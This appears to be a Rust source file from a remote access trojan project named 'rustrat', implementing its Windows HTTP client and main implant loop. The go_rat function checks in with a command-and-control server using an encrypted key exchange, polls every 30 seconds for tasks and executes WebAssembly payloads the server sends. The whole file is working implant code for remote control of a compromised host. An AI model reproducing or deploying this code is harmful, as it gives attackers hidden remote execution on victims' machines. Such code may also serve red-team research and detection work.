// TODO: Initial state -> generate public key -> checkin -> regenerate public key if failed, otherwise continue -> fetch task -> execute task

pub mod error;

use crate::ffi::{FfiType, FnTable, GetLastError, Win32FfiTypes};
use crate::run_webassembly;

use rustrat_common::encryption;
use rustrat_common::messages as common_messages;
use rustrat_prng_seed::get_rand_seed;

use base64;
use libffi::middle::arg;
use rand::{rngs, Rng, SeedableRng};
use std::ffi::CString;
use std::os::raw::c_void;
use std::{ptr, str};
use x25519_dalek;

pub struct InternetHandle<'a> {
    // TODO Arc<RwLock<FnTable>>?
    fn_table: &'a FnTable,
    handle: *mut c_void,
}

pub struct InternetUrlHandle<'a> {
    fn_table: &'a FnTable,
    handle: *mut c_void,
    // TODO is this neccessary? I believe we want to close the handle to this before InternetHandle's
    _internet_handle: &'a InternetHandle<'a>,
}

bitflags! {
    pub struct InternetUrlFlags: u32 {
        const INTERNET_FLAG_HYPERLINK = 0x400;
        const INTERNET_FLAG_IGNORE_CERT_CN_INVALID = 0x1000;
        const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x2000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP = 0x8000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS = 0x4000;
        const INTERNET_FLAG_KEEP_CONNECTION = 0x400000;
        const INTERNET_FLAG_NEED_FILE = 0x10;
        const INTERNET_FLAG_NO_AUTH = 0x40000;
        const INTERNET_FLAG_NO_AUTO_REDIRECT = 0x200000;
        const INTERNET_FLAG_NO_CACHE_WRITE = 0x4000000;
        const INTERNET_FLAG_NO_COOKIES = 0x80000;
        const INTERNET_FLAG_NO_UI = 0x200;
        const INTERNET_FLAG_PRAGMA_NOCACHE = 0x100;
        const INTERNET_FLAG_RELOAD = 0x80000000;
        const INTERNET_FLAG_RESYNCHRONIZE = 0x800;
        const INTERNET_FLAG_SECURE = 0x800000;
    }
}

impl<'a> InternetHandle<'a> {
    // TODO possibly allow to set proxy setting/configure to only use direct connection
    pub fn create(fn_table: &'a FnTable, ua_string: CString) -> error::Result<Self> {
        let handle: *mut c_void;

        unsafe {
            handle = fn_table.call_fn::<*mut c_void>(
                "InternetOpenA".to_string(),
                &[
                    arg(&ua_string.as_ptr()),
                    arg(&0u32), //INTERNET_OPEN_TYPE_PRECONFIG
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&0u32), //No flags, synchronous request
                ],
            )?;

            if handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(InternetHandle { fn_table, handle })
    }

    // TODO NEXT, make sure things that are pointed to do not go out of scope
    pub fn create_url_handle(
        &self,
        url: CString,
        headers: Option<&CString>,
        flags: InternetUrlFlags,
    ) -> error::Result<InternetUrlHandle> {
        let handle: *mut c_void;
        let headers_ptr = match headers {
            Some(header_string) => header_string.as_ptr() as *const c_void,
            None => ptr::null::<c_void>(),
        };

        unsafe {
            handle = self.fn_table.call_fn(
                "InternetOpenUrlA".to_string(),
                &[
                    arg(&self.handle),
                    arg(&url.as_ptr()),
                    arg(&headers_ptr),
                    arg(&-1i32),
                    arg(&flags.bits()),
                    arg(&ptr::null::<c_void>()),
                ],
            )?;

            if handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(InternetUrlHandle {
            fn_table: self.fn_table,
            handle: handle,
            _internet_handle: self,
        })
    }
}

impl<'a> InternetUrlHandle<'a> {
    // TODO allow passing dwInfoLevel flags to HttpQueryInfoA get specific information
    pub fn get_response_headers(&self) -> error::Result<Vec<u8>> {
        let chunk_size = 0xffff;
        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
        // Note that HttpQueryInfoA writes bytes written to capacity.
        let mut capacity: u32 = out.capacity() as u32;
        let mut lpdwindex: u32 = 0;
        let mut is_successful: i32 = 0;

        // Now this looks quite ugly, is_successful is perhaps a bad variable name as it is used here (as a i32).
        // Also, the structure is possibly not best for readability, but I could not think of a more pretty way to do it when I wrote this function.
        unsafe {
            while is_successful == 0 {
                is_successful = self.fn_table.call_fn(
                    "HttpQueryInfoA".to_string(),
                    &[
                        arg(&self.handle),
                        arg(&22u32), // HTTP_QUERY_RAW_HEADERS_CRLF
                        arg(&out.as_mut_ptr()),
                        arg(&(&mut capacity as *mut _ as *mut c_void)),
                        arg(&(&mut lpdwindex as *mut _ as *mut c_void)),
                    ],
                )?;

                if is_successful == 0 {
                    let error_code = GetLastError();
                    if error_code != 122 {
                        // 122 = ERROR_INSUFFICIENT_BUFFER
                        return Err(error::Error::WinApiError(GetLastError()));
                    }

                    out.reserve(out.capacity() + chunk_size);
                    capacity = out.capacity() as u32;
                    lpdwindex = 0;
                }
            }

            // Remember that HttpQueryInfoA writes bytes written to capacity.
            out.set_len(capacity as usize);
        }

        out.shrink_to_fit();
        Ok(out)
    }

    // After the response has been read, it is not possible to read it again, so this function takes ownership of the struct.
    // The result could be "cached", but I won't do it unless it is required.
    pub fn get_response(self) -> error::Result<Vec<u8>> {
        let chunk_size = 0xffff;
        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
        let mut total_bytes_written: u32 = 0;
        let mut bytes_written: u32 = 0;

        unsafe {
            //is_successful is a boolean, 0 = false
            let mut is_successful: i32 = self.fn_table.call_fn(
                "InternetReadFile".to_string(),
                &[
                    arg(&self.handle),
                    arg(&out.as_mut_ptr()),
                    arg(&(out.capacity() as u32 - total_bytes_written)),
                    arg(&(&mut bytes_written as *mut u32)),
                ],
            )?;

            while is_successful != 0 && bytes_written != 0 {
                total_bytes_written += bytes_written;
                bytes_written = 0;

                out.set_len(total_bytes_written as usize);
                out.reserve(chunk_size);

                // TODO use spare_capacity_mut when stable https://doc.rust-lang.org/std/vec/struct.Vec.html#method.spare_capacity_mut
                is_successful = self.fn_table.call_fn(
                    "InternetReadFile".to_string(),
                    &[
                        arg(&self.handle),
                        arg(&out.as_mut_ptr().add(total_bytes_written as usize)),
                        arg(&(out.capacity() as u32 - total_bytes_written)),
                        arg(&(&mut bytes_written as *mut u32)),
                    ],
                )?;
            }

            // TODO Documentation mentions ERROR_INSUFFICIENT_BUFFER, but I have been unable to encounter that so far. Does it need to be handled?
            if is_successful == 0 {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        out.shrink_to_fit();
        Ok(out)
    }
}

impl<'a> Drop for InternetHandle<'a> {
    fn drop(&mut self) {
        unsafe {
            let _ = self
                .fn_table
                .call_fn::<u32>("InternetCloseHandle".to_string(), &[arg(&self.handle)]);
        }
    }
}

impl<'a> Drop for InternetUrlHandle<'a> {
    fn drop(&mut self) {
        unsafe {
            let _ = self
                .fn_table
                .call_fn::<u32>("InternetCloseHandle".to_string(), &[arg(&self.handle)]);
        }
    }
}

pub fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
    fn_table.register_fn(
        "InternetOpenA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetOpenUrlA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::POINTER as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetReadFile".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "HttpQueryInfoA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::UINT32 as i32,
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetCloseHandle".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[FfiType::POINTER as i32],
    )?;

    Ok(())
}

// TODO This function is meant as a small POC, quick'n'dirty. Should be reworked, possibly moved and more. Should probably not panic (at least this much)
pub fn go_rat(url: String, server_public_key: encryption::PublicKey) {
    let mut fn_table = FnTable::new();
    register_wininet_fns(&mut fn_table).unwrap();

    let internet_handle = InternetHandle::create(
        &fn_table,
        CString::new(format!("rustrat-client/{}", env!("CARGO_PKG_VERSION"))).unwrap(),
    )
    .unwrap();

    // TODO waiting x25519_dalek version 2, https://github.com/dalek-cryptography/x25519-dalek/pull/64
    //let private_key = x25519_dalek::EphemeralSecret::new(rngs::StdRng::from_seed(get_rand_seed()));

    // TODO keys will now reside in memory, do we need to do something about that?
    let mut rng = rngs::StdRng::from_seed(get_rand_seed());
    let mut private_key: encryption::PrivateKey = [0u8; 32];
    rng.fill(&mut private_key);

    let rat_private_key = x25519_dalek::StaticSecret::from(private_key);
    let rat_public_key = x25519_dalek::PublicKey::from(&rat_private_key).to_bytes();
    let server_public_key = x25519_dalek::PublicKey::from(server_public_key);
    let rat_shared_secret =
        encryption::get_shared_key(rat_private_key.to_bytes(), server_public_key.to_bytes());

    let public_key_b64 = base64::encode_config(rat_public_key, base64::URL_SAFE_NO_PAD);

    let checkin_request = internet_handle
        .create_url_handle(
            CString::new(url.clone()).unwrap(),
            Some(&CString::new("Cookie: uid=".to_owned() + &public_key_b64).unwrap()),
            InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
                | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
                | InternetUrlFlags::INTERNET_FLAG_RELOAD,
        )
        .unwrap();

    let checkin_headers = str::from_utf8(&checkin_request.get_response_headers().unwrap())
        .unwrap()
        .to_lowercase();
    if !checkin_headers.contains("200 ok") {
        panic!("Checkin unsuccessful");
    }

    let checkin_body = checkin_request.get_response().unwrap();
    let checkin_encrypted_response: common_messages::server_to_rat::Message =
        common_messages::deserialize(&checkin_body).unwrap();

    let checkin_response = match checkin_encrypted_response {
        common_messages::server_to_rat::Message::EncryptedMessage(msg) => {
            match msg.to_response(rat_shared_secret) {
                std::result::Result::Ok(response) => response,
                std::result::Result::Err(_) => panic!("Unable to decrypt response from server"),
            }
        }
    };

    match checkin_response {
        common_messages::server_to_rat::Response::CheckinSuccessful => {
            log::info!(
                "Checked in to C2 server with public key {:?}",
                rat_public_key
            );
        }
        _ => panic!("Server returned with something other than CheckinSuccessful"),
    }

    loop {
        let request = common_messages::rat_to_server::Request::GetPendingTask.to_encrypted_message(
            rat_public_key,
            rat_shared_secret,
            &mut rng,
        );

        let msg = match request {
            std::result::Result::Ok(request) => base64::encode_config(
                common_messages::serialize(
                    &common_messages::rat_to_server::Message::EncryptedMessage(request),
                )
                .unwrap(),
                base64::URL_SAFE_NO_PAD,
            ),
            std::result::Result::Err(_) => panic!("Unable to encrypt message"),
        };

        let task_request = internet_handle
            .create_url_handle(
                CString::new(url.clone() + "/renew?t=" + &msg).unwrap(),
                None,
                InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
                    | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
                    | InternetUrlFlags::INTERNET_FLAG_RELOAD,
            )
            .unwrap();

        let task_response = task_request.get_response().unwrap();
        if task_response.len() > 0 {
            let msg: common_messages::server_to_rat::Message =
                common_messages::deserialize(&task_response).unwrap();
            let response = match msg {
                common_messages::server_to_rat::Message::EncryptedMessage(encrypted_msg) => {
                    match encrypted_msg.to_response(rat_shared_secret) {
                        std::result::Result::Ok(response) => response,
                        std::result::Result::Err(_) => {
                            panic!("Unable to decrypt message from server")
                        }
                    }
                }
            };

            match response {
                common_messages::server_to_rat::Response::Task(task) => match task {
                    common_messages::server_to_rat::Task::WebAssemblyTask { wasm, fn_name } => {
                        log::debug!(
                            "Running function {} from WASM blob sent by C2 server",
                            fn_name
                        );
                        run_webassembly(wasm, &fn_name).unwrap();
                    }
                },
                common_messages::server_to_rat::Response::NoTasks => {}
                common_messages::server_to_rat::Response::Exit => panic!("Server sent exit"),
                _ => todo!(),
            }
        }

        std::thread::sleep(std::time::Duration::from_secs(30));
    }
}
